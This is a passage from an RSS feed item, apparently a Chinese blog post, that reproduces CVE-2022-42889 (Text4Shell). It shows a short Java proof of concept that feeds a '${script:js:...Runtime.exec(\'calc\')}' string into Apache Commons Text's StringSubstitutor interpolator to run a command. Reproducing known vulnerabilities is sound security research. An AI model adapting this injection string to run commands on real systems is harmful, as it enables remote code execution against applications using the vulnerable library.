style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;复现代码&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;import&lt;/span&gt; org.apache.commons.text.StringSubstitutor;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#f3f99d&#34;&gt;CVE_2022_42889&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#ff5c57&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#9aedfe&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;main&lt;/span&gt;(String&lt;span style=&#34;color:#ff6ac1&#34;&gt;[]&lt;/span&gt; args) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        StringSubstitutor interpolator &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; StringSubstitutor.&lt;span style=&#34;color:#57c7ff&#34;&gt;createInterpolator&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        interpolator.&lt;span style=&#34;color:#57c7ff&#34;&gt;replace&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;${script:js:java.lang.Runtime.getRuntime().exec(\&amp;#34;calc\&amp;#34;)}&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pr</description>
    </item>
  </channel>
</rss>
